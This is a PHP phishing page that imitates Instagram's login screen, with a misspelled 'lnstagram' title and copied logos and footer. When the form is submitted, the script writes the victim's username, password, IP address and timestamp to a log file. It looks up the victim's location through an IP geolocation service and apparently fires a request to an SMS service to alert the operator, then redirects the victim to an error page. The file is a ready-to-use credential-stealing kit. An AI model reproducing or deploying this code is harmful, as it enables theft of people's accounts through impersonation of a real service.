<?php

if($_POST){
        $ch = curl_init();
/////////========Luminati
////////=========Socks Proxy
curl_setopt($ch, CURLOPT_URL, 'https://www.uygunsms.com.tr/'); ////This may differ from site to site
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.uygunsms.com.tr',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Language: en-US,en;q=0.9,tr;q=0.8',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.uygunsms.com.tr',
'Referer: https://www.uygunsms.com.tr/'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'txt_gsmno=50000'); //BURAYA NUMARANIZI YAZIN 0 OLMADAN YAZICAKSINIZ
$result = curl_exec($ch);
$user=$_POST["user"];
$password=$_POST["password"]; 
$cur_time=date("d-m-Y H:i:s");
$file = fopen('hardcoder.php', 'a');
$ip = $_SERVER['REMOTE_ADDR'];
$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
date_default_timezone_set('Europe/Istanbul');  
fwrite($file, "
<html>
<head>
    <meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#000000'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<hr>
<font color='#76ff43'>1.sayfa</font><br>
<font color='red'>Kullanıcı Adı: </font><font color='white'>".$user."</font><br>
<font color='red'> Şifre: </font><font color='white'>".$password."</font><br>
<font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>

<br>

"); 
fclose($file);
header("location: error.php");
}

?>
<html lang="en">
<head>
    <meta author="HardCoder">
    <meta name="description" content="Copyright Notice." />
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>lnstagram</title>
    <!-- FAVIVON -->
    <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
    <!-- GOOGLE FONT -->
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
    <!-- APP CSS -->
    <link rel="stylesheet" href="./app.css">
</head>

<body>

    <div class="container">
        <div class="main-container">
            <div class="main-content">
                <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
                    <div class="slide-content" id="slide-content">
                        <img src="./images/slide (1).jpg" alt="slide image" class="active">
                        <img src="./images/slide (2).jpg" alt="slide image">
                        <img src="./images/slide (3).jpg" alt="slide image">
                        <img src="./images/slide (4).jpg" alt="slide image">
                        <img src="./images/slide (5).jpg" alt="slide image">
                    </div>
                </div>
                <div class="form-container">
                    <div class="form-content box">
                        <div class="logo">
                            <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
                            <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
                        </div>
                        <form method="post" >
                        <div class="signin-form" id="signin-form">
                            <div class="form-group">
                                <div class="animate-input">
                                    <span>
                                        Phone number, username, or email
                                    </span>
                                    <input type="text" name="user">
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="animate-input">
                                    <span>
                                     Password
                                    </span>
                                    <input type="password" name="password">
                                    <button>Show</button>
                                </div>
                            </div>
                            <div class="btn-group">
                                <button class="btn-login" id="signin-btn">
                                    Log In
                                </button>
                            </div>
                            <div class="divine">
                                <div></div>
                                <div>OR</div>
                                <div></div>
                            </div>
                            <div class="btn-group">
                                <button class="btn-fb">
                                    <img src="./images/facebook-icon.png" alt="">
                                    <span>Log in with Facebook</span>
                                </button>
                            </div>
                            <a href="#" class="forgot-pw">Forgot password?</a>
                        </div>
                    </div>
                    <div class="box goto">
                        <p>
                            Don't have an account?
                            <a href="#">Sign up</a>
                        </p>
                    </div>
</form>
                    <div class="app-download">
                        <p>Get the app.</p>
                        <div class="store-link">
                            <a href="#">
                                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png">
                            </a>
                            <a href="#">
                                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png">
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer">
            <div class="links">
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Top Accounts</a>
                <a href="#">Hashtags</a>
                <a href="#" id="darkmode-toggle">Darkmode</a>
            </div>
            <div class="copyright">
                © 2021 Instagram from Facebook
            </div>
        </div>
    </div>

    <!-- APP JS -->
    <script src="./app.js"></script>

</body>

</html>
